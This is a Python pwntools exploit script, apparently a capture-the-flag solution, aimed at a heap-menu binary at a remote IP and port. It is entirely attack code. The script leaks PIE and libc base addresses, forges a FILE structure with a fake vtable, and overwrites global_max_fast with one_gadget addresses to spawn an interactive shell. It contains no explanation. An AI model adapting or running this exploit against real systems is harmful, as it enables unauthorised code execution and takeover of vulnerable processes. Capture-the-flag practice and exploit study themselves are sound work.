#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './pwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = elf.libc
one_gadget = [0x45216 , 0x4526a , 0xf02a4 , 0xf1147]
if args['REMOTE']:
	
	p = remote('47.108.30.122', 40680)
else:
	libc = context.binary.libc
	p = process('./pwn')

def dbg():
	raw_input()

def menu(ch):
	p.sendlineafter('4.exit\n', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('Length:\n', str(size))
	p.sendafter('Content:\n',content)
	print "add a chunk success"

def edit(content):
	menu(3)
	p.sendlineafter('Name:\n',content)
	#print "edit %d chunk success" % idx

def free(idx):
	menu(2)
	p.sendlineafter('Id:\n', str(idx))
	print "free chunk %d success " % idx

def exploit():
	menu(666)
	array = int(p.recvline().strip('\n'), 16)
	pie_base = array - 0x202040
	print "array ==> " + hex(array)
	print "pie_base ==> " + hex(pie_base)

	add(0x128, 'aaaa')	#0
	add(0x128, 'bbbb')	#1

	free(0)	
	add(0x128, 'aaaaaaaa')	#0
	p.recvuntil('Content is:\n')
	main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
	libc_base = main_arena - main_arena_offset - 0x58
	libc.address = libc_base
	print "main_arena ==> " + hex(main_arena)
	print "libc_base ==> " + hex(libc_base)

	fake_file = 'a' * (0x20 - 0x10)     #padding
	fake_file += p64(0)                 #write_base => offset_0x20
	fake_file += p64(1)                 #write_ptr  => offset_0x28
	fake_file += 'b' * (0xb8 - 0x28)    #padding
	fake_file += p64(0)                 #mode       => offset_0xc0
	fake_file += 'c' * (0xd0 - 0xc0)    #padding
	fake_file += p64(pie_base + 0x2020E0 - 0x18)   #vtable     => offset_0xd8

	add(0x1400, fake_file)			#2
	edit(p64(libc.address + one_gadget[1])*4 + p64(libc_base+global_max_fast_offset))

	free(2)
	menu(4)

	p.interactive()
	p.close()


if __name__ == '__main__':
	main_arena_offset = 0x3c4b20
	global_max_fast_offset = 0x3c67f8
	exploit()